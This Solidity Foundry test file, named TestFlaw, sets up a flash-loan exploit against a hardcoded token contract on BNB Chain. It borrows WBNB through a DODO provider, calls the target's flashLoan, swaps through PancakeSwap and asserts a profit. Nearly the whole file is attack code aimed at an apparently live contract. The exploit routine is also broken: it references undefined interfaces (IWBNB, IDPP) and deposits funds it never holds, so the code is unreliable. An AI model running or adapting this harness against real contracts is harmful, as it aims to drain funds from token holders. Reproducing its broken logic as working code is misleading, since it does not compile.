// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import "forge-std/Test.sol";

interface IWETH {
    function deposit() external payable;
    function transfer(address to, uint256 value) external returns (bool);
    function approve(address guy, uint256 wad) external returns (bool);
    function withdraw(uint256 wad) external;
    function balanceOf(address) external view returns (uint256);
}

interface IERC20 {
    function approve(address guy, uint256 wad) external returns (bool);
    function balanceOf(address) external view returns (uint256);
    function transfer(address to, uint256 value) external returns (bool);
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IUniswapV2Pair {
  function decimals() external pure returns (uint8);
  function totalSupply() external view returns (uint);
  function balanceOf(address owner) external view returns (uint);
  function allowance(address owner, address spender) external view returns (uint);

  function approve(address spender, uint value) external returns (bool);
  function transfer(address to, uint value) external returns (bool);
  function transferFrom(address from, address to, uint value) external returns (bool);

  function MINIMUM_LIQUIDITY() external pure returns (uint);
  function factory() external view returns (address);
  function token0() external view returns (address);
  function token1() external view returns (address);
  function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
  function price0CumulativeLast() external view returns (uint);
  function price1CumulativeLast() external view returns (uint);
  function kLast() external view returns (uint);

  function mint(address to) external returns (uint liquidity);
  function burn(address to) external returns (uint amount0, uint amount1);
  function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
  function skim(address to) external;
  function sync() external;
}

interface IUniswapV2Router {
    function factory() external view returns (address);
    function WETH() external pure returns (address);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountToken, uint amountETH);
}

interface IBalancerVault {
    function flashLoan(
        address recipient,
        address[] memory tokens,
        uint256[] memory amounts,
        bytes memory userData
    ) external;
}

interface IDODO {
    function flashLoan(
        uint256 loanAmount,
        uint256 feeAmount,
        address receiver,
        bytes calldata data
    ) external;
}

interface ITokenTool {
    function _owner() external returns (address);
    function marketingWalletAddress() external returns (address);
    function teamWalletAddress() external returns (address);
    function deadAddress() external returns (address);
    function _isBlacklisted(address) external returns (bool);
    function isExcludedFromFee(address) external returns (bool);
    function isWalletLimitExempt(address) external returns (bool);
    function isTxLimitExempt(address) external returns (bool);
    function isMarketPair(address) external returns (bool);
    function _buyLiquidityFee() external returns (uint256);
    function _buyMarketingFee() external returns (uint256);
    function _buyTeamFee() external returns (uint256);
    function _buyDestroyFee() external returns (uint256);
    function _sellLiquidityFee() external returns (uint256);
    function _sellMarketingFee() external returns (uint256);
    function _sellTeamFee() external returns (uint256);
    function _sellDestroyFee() external returns (uint256);
    function _liquidityShare() external returns (uint256);
    function _marketingShare() external returns (uint256);
    function _teamShare() external returns (uint256);
    function _totalDistributionShares() external returns (uint256);
    function _totalTaxIfBuying() external returns (uint256);
    function _totalTaxIfSelling() external returns (uint256);
    function _tFeeTotal() external returns (uint256);
    function _maxDestroyAmount() external returns (uint256);
    function _maxTxAmount() external returns (uint256);
    function _walletMax() external returns (uint256);
    function uniswapV2Router() external returns (address);
    function uniswapPair() external returns (address);
    function swapAndLiquifyEnabled() external returns (bool);
    function swapAndLiquifyByLimitOnly() external returns (bool);
    function checkWalletLimit() external returns (bool);
    function owner() external view returns (address);
    function waiveOwnership() external;
    function transferOwnership(address) external;
    function getTime() external view returns (uint256);
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
    function totalSupply() external view returns (uint256);
    function balanceOf(address) external view returns (uint256);
    function allowance(address,address) external view returns (uint256);
    function increaseAllowance(address,uint256) external returns (bool);
    function decreaseAllowance(address,uint256) external returns (bool);
    function minimumTokensBeforeSwapAmount() external view returns (uint256);
    function approve(address,uint256) external returns (bool);
    function setMarketPairStatus(address,bool) external;
    function setIsTxLimitExempt(address,bool) external;
    function setIsExcludedFromFee(address,bool) external;
    function setMaxDesAmount(uint256) external;
    function setBuyDestFee(uint256) external;
    function setSellDestFee(uint256) external;
    function setBuyTaxes(uint256,uint256,uint256) external;
    function setSelTaxes(uint256,uint256,uint256) external;
    function multipleBotlistAddress(address[] calldata,bool) external;
    function setDistributionSettings(uint256,uint256,uint256) external;
    function setMaxTxAmount(uint256) external;
    function enableDisableWalletLimit(bool) external;
    function setIsWalletLimitExempt(address,bool) external;
    function setWalletLimit(uint256) external;
    function setNumTokensBeforeSwap(uint256) external;
    function setMarketingWalletAddress(address) external;
    function setTeamWalletAddress(address) external;
    function setSwapAndLiquifyEnabled(bool) external;
    function setSwapAndLiquifyByLimitOnly(bool) external;
    function getCirculatingSupply() external view returns (uint256);
    function changeRouterVersion(address) external returns (address);
    function transfer(address,uint256) external returns (bool);
    function transferFrom(address,address,uint256) external returns (bool);
}





contract TestFlaw is Test {
    address internal target;
    address internal token0;
    address internal token1;
    address internal token;
    IUniswapV2Router internal uniswapRouter;
    IUniswapV2Pair internal uniswapPair;
    IERC20 private valuableToken;
    address private flashloanProvider;

    function setUniswapPair(address addr) public {
        IUniswapV2Factory uniswapFactory = IUniswapV2Factory(uniswapRouter.factory());
        uniswapPair = IUniswapV2Pair(uniswapFactory.getPair(address(valuableToken), addr));

        if (address(uniswapPair) == address(0)) {
            console.log("Uniswap pair not found.");
            return;
        }

        token0 = uniswapPair.token0();
        token1 = uniswapPair.token1();

        valuableToken.approve(address(uniswapRouter), type(uint256).max);
        IERC20(addr).approve(address(uniswapRouter), type(uint256).max);

        uint112 reserve0;
        uint112 reserve1;
        (reserve0, reserve1, ) = uniswapPair.getReserves();
        console.log("Uniswap reserves for %s:", addr);
        console.log("%d for %s", reserve0, token0);
        console.log("%d for %s", reserve1, token1);
    }

    function setUp() public {

        target = 0x3c6C6d32609d253d54951dB187DAEc272b1d848a;
        uniswapRouter = IUniswapV2Router(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        valuableToken = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
        flashloanProvider = 0x6098A5638d8D7e9Ed2f952d35B2b67c34EC6B476;
        token = 0x3c6C6d32609d253d54951dB187DAEc272b1d848a;

        // Remove any previous valuableToken/ETH from the balance
        valuableToken.transfer(address(0xdead), valuableToken.balanceOf(address(this)));
        IERC20(uniswapRouter.WETH()).transfer(address(0xdead), IERC20(uniswapRouter.WETH()).balanceOf(address(this)));
        payable(address(0xdead)).transfer(address(this).balance);

        // Handle approvals
        valuableToken.approve(target, type(uint256).max);
        //if (token != address(0))
        //    IERC20(token).approve(target, type(uint256).max);
        setUniswapPair(token);
    }

    function testFlaw() external {
         // flashloan valuableToken from Balancer
        address[] memory tokens = new address[](1);
        tokens[0] = address(valuableToken);

        uint256[] memory amounts = new uint256[](1);
        amounts[0] = valuableToken.balanceOf(flashloanProvider) * 95 / 100;

        console.log("%s available for the flashloan of valuableToken", amounts[0]);

        uint256 finalValuableBalance = valuableToken.balanceOf(address(this));
        console.log("Initial balance %s", finalValuableBalance);
        IDODO(flashloanProvider).flashLoan(amounts[0], 0, address(this), "0x0");
        console.log("Final balance %s", valuableToken.balanceOf(address(this)));
    }

    // Used by Balancer
    function receiveFlashLoan(
        IERC20[] memory,
        uint256[] memory amounts,
        uint256[] memory,
        bytes memory
    ) external {
        flashLoanInternal(amounts[0]);
    }

    // Used by DODO
    function DPPFlashLoanCall(address, uint256 amount, uint256, bytes memory) external {
        flashLoanInternal(amount);
    }

    function flashLoanInternal(uint256 amount) internal {
        executeExploit(amount);

        uint256 currentValuableBalance = valuableToken.balanceOf(address(this));
        if (amount >= currentValuableBalance) {
            console.log("Current valuable balance: %s", valuableToken.balanceOf(address(this)));
            console.log("Current profit: %s", int256(currentValuableBalance) - int256(amount));
            revert("Not enough valuableToken balance to produce profit");
        }
        valuableToken.transfer(flashloanProvider, amount);
        uint256 surplusInValuable = valuableToken.balanceOf(address(this));
        console.log("Surplus: %s", surplusInValuable);
        assert(surplusInValuable > 0);
    }

    function executeExploit(uint256 amount) internal {
    // 1. Obtain the WBNB balance and deposit it
    IWBNB wbnb = IWBNB(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    wbnb.deposit{value: amount}();

    // 2. Approve the valuable token for the DPP contract
    valuableToken.approve(target, type(uint256).max);

    // 3. Flash loan the amount of valuable tokens
    IDPP(target).flashLoan(amount, 0, address(this), "");

    // 4. We need the DPP contract to execute a swap for WBNB
    uint256 valuableTokensToSwap = valuableToken.balanceOf(address(this));
    address[] memory path = new address[](2);
    path[0] = address(valuableToken);
    path[1] = address(wbnb);

    uniswapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
        valuableTokensToSwap, 
        0, // amountOutMin
        path, 
        address(this), 
        block.timestamp
    );

    // 5. Withdraw the WBNB back to the original account
    uint256 wbnbBalance = wbnb.balanceOf(address(this));
    wbnb.withdraw(wbnbBalance);
}
}


